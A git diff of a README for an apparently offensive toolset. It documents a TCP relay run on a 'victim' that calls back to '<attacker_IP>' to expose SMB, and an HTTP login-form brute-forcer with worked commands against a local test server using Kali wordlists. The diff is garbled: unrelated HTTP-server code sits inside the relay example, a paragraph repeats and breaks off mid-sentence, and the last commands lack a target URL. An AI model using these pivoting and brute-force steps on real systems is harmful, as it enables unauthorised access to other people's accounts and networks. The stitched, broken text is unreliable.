@@ -13,6 +13,35 @@ All requirements have been rolled into one requirements file, to get up and runn
 
 Then go!
 
+### Installation
+
+Scripts can simply be run from the command line; the interpreter is usually /usr/bin/env python3.
+
+The toolset is designed to run on Linux machines, though there is no reason why Windows compatibility should be broken. As usual, any requests or issues welcome at [info@blackfell.net](mailto:info@blackfell.net).
+
+'Installation' can be achieved in a hack-y manner in Linux by adding the directory to path:
+
+#### Bash
+
+Installation from scratch:
+
+```
+~$ git clone https://github.com/Blackfell/python_widgets
+~$ cd python_widgets
+~$ python -m pip install -r requirements.txt && echo "export PATH=$PATH:$(pwd)" >> ~/.bashrc
+```
+
+#### ZSH
+
+Installation from scratch:
+
+```
+~$ git clone https://github.com/Blackfell/python_widgets
+~$ cd python_widgets
+~$ python -m pip install -r requirements.txt && echo "export PATH=$PATH:$(pwd)"  >> ~/.zshrc
+```
+
+
 ## rot_hunter
 
 This is the first tool I've published so far and is somehting I use when feeling too lazy to try different rot encodings during CTFs. This tool takes two files as command line arguments, one containing your ciphertext, one containing a dictinary of valid words; the tool will find the most likely rot key and allow you to parse all other options in decreasing order of confidence the solution is good.
@@ -21,7 +50,7 @@ I've inluded a couple of test files for your enjoyment; check out the file heade
 
 ## TCP Relay
 
-This tool is a (slightly) simpler version of a netcat relay, without netcat, trickery, magic etc. Just drop the relay on your target and start forwarding TCP ports. 
+This tool is a (slightly) simpler version of a netcat relay, without netcat, trickery, magic etc. Just drop the relay on your target and start forwarding TCP ports.
 
 You should compile your own binary for your systems if you can, but a copy is included in the repo for speediness.
 
@@ -37,7 +66,7 @@ optional arguments:
   -t, --tee             Also print all traffic on Stdout.
   -v, --verbose         Print more stuff during execution.
 ```
-It's like nc | nc with backpipes and nc -e nc.bat, but without the faff! 
+It's like nc | nc with backpipes and nc -e nc.bat, but without the faff!
 
 ### Examples
 
@@ -55,8 +84,127 @@ attacker@attacker ~$ relay.py -l 4444 -l 9999 -v -t
 
 This will set up a local relay to catch the callback and serve relay traffic to port 9999; the *-v* and *-t* tags make the tool vun verbosely and tee all data to the console respectively. Now execute a callback relay from the victim:
 
-``` 
+``` def run(server_class=HTTPServer, handler_class=S, port=8080):
+    logging.basicConfig(level=logging.INFO)
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    logging.info('Starting httpd...\n')
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    httpd.server_close()
+    logging.info('Stopping httpd...\n')
+
+if __name__ == '__main__':
+    from sys import argv
+
+    if len(argv) == 2:
+        run(port=int(argv[1]))
+    else:
+        run()
 C:\relay.exe -c 127.0.0.1 445 -c <attacker_IP> 4444
 ```
 
 Now you'll be able to access SMB from your **attacker** machine, port 9999. Enjoy!
+
+## HTTP form brute
+
+This tool exists because I can never remember how to work THC hydra when guessing HTTP post forms. To help me remember the syntax, the capabilities of THC hydra have been imiated and broken out into individual command line switches.
+
+```
+usage: http-form-brute.py [-h] -u URL (-l LOGIN | -L LOGIN_LIST  -p PASSWORD | -P PASSWORD_LIST) [-t  THREADS]
+                          [-pU USER_PARAM] [-pP PASS_PARAM] [-pE EXTRA_PARAM [EXTRA_PARAM ...]] [-c]
+                          (-sM SUCCESS_MATCH | -sX SUCCESS_EXCLUDE)
+```
+
+### Usage
+
+HTTP login forcer supports the following command line options:
+
+```
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     Hostname or IP address to attack (e.g. http://site.com/login.php).
+  -l LOGIN, --login LOGIN
+                        Username to attack with.
+  -L LOGIN_LIST, --login-list LOGIN_LIST
+                        User list to attack with.
+  -p PASSWORD, --password PASSWORD
+                        Password to attack with.
+  -P PASSWORD_LIST, --password-list PASSWORD_LIST
+                        Password list to attack with.
+  -t  THREADS, --threads THREADS
+                        Number of attack threads (default - 25)
+  -pU USER_PARAM, --user-param USER_PARAM
+                        HTTP form parameter for username (without '&') default setting 'username'.
+  -pP PASS_PARAM, --pass-param PASS_PARAM
+                        HTTP form parameter for password (without '&') default setting 'password'.
+  -pE EXTRA_PARAM [EXTRA_PARAM ...], --extra-param EXTRA_PARAM [EXTRA_PARAM ...]
+                        Extra (non-brutable) form parameter (.e.g. '&login=Submit'
+  -c, --cont            Continue brute-forcing once one valid cred has been found (Default False).'
+  -sM SUCCESS_MATCH, --success-match SUCCESS_MATCH
+                        String to match on successful login - if found - login successful (e.g. "Successful").
+  -sX SUCCESS_EXCLUDE, --success-exclude SUCCESS_EXCLUDE
+                        String to match on failed login - if not found, login successful (e.g. "not valid").
+```
+
+For a successful http form attack, a URL, user-parameter and password-parameter must all be provided; these can be found by inspecting the web form, or valid request and understanding how and where requests are submitted.
+
+In order to validate whether a credential is good or not, either a success-match or success-exclude parameter must be provided; this parameter will trigger a *valid credential* message whenever it is present or absence in the response resepectively. Examples may be a success-match for *'login successful'* or a success-exclude for *'login failed'*.
+
+Finally, a password (or password list) and username (or username list) must be provided.
+
+Additional arguments are available to support limited web application intricacies; the key one being extra-params; these are any other post data parameters (along with their values) that are required by the web app. This may be somethign like *'&login=Submit'*.
+
+### Examples
+
+There is a test server available in the resources directory that can be started as follows:
+
+```
+~$ python3 resources/http-form-brute/test-http-form-server.py 8080
+```
+
+Note that the file is not executable by default. Using this server, you'll be able to test the script against a local server on port 8080. All examples are carried out against this script.
+
+#### Crack me if you can
+
+Before you read further, why not try and get the tool to work against the test server?
+
+The server doesn't do much, but it is expecting a POST request to /login.php (don't forget to specify a post number - default is 8080); requests made should have post data of the format *pass=<password>&user=<username>*, so the user vaiable is called **user**  and the password parameter is called **pass**; *<username>* and *<password>* are the post parameter variables, which the tool will iterate for you.
+
+On an unsuccessful login, you'll receive a response with **'Login failed.'** in it, if the username is incorrect, the response will also have **'Bad username'** in it, if the password is incorrect (but username is correct), the response will still say login failed, but **'Bad password'** will also be included. If the login details are correct, the response will have **'Login successful!'** in it.
+
+The valid username for the test server exists in the Matasploit **unix_users.txt** wordlist, which is packaged with Kali Linux under */usr/share/wordlists/metasploit/unix_users.txt*. The valid password exists in the **fasttrack.txt** wordlist, packaged with Kali Linux under */usr/share/wordlists/fasttrack.txt*.
+
+Note that you're running Python against Python on one machine and there are inefficiencies that will slow down both the server and bruter processes (even though they use multiprocessing). It's advisable to lower the thread count to 2 or 3 using the *'-t'* flag during testing.
+
+Give it a try!
+
+#### Worked Examples - warning : here be spoilers!
+
+Running the test server on our localhost, there are various ways we can run the login bruter. All examples use the wordlist paths that are default locations in Kali Linux 2020, your wordlists may be nonexistent or elsewhere.
+
+In order to validate whether a credential is good or not, either a success-match or success-exclude parameter must be provided; this parameter will trigger a *valid credential* message whenever it is present or absence in the response resepectively. Examples may be a success match for *'login successful'* or a sucess-exclude
+
+Consider the following cases:
+
+```
+~$ http-form-brute.py -pU user -pP pass -L /usr/share/wordlists/metasploit/unix_users.txt -p anypassword -sX "Bad username" -u http://localhost:8080/login.php -t 3
+
+~$ http-form-brute.py -pU user -pP pass -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/fasttrack.txt -sM "Login successful" -u http://localhost:8080/login.php -t 3
+```
+Carrying out the attack via the first means carries out a search for any responses that **don't include** the string *'Bad username'*, effectively searching for the valid username. The second way will permute all users and passwords, which will take longer; therefore, we'll be avoiding this. Not that only three threads are used to avoid broken pipes etc. dur to teh server running on the same machine.
+
+In order to validate whether a credential is good or not, either a success-match or success-exclude parameter must be provided; this parameter will trigger a *valid credential* message whenever it is present or absence in the response resepectively. Examples may be a success match for *'login successful'* or a sucess-exclude
+Carrying out the user brute method, it should be apparent that the valid username is *'auditor'*; this can then be used to brute force the password:
+
+```
+~$ http-form-brute.py -pU user -pP pass -l auditor -p /usr/share/wordlists -sX "Login failed." -t 3
+```
+
+This, in the case of the test site, is equivalent to:
+
+```
+~$ http-form-brute.py -pU user -pP pass -l auditor -p /usr/share/wordlists -sM "Login successful" -t 3
+```
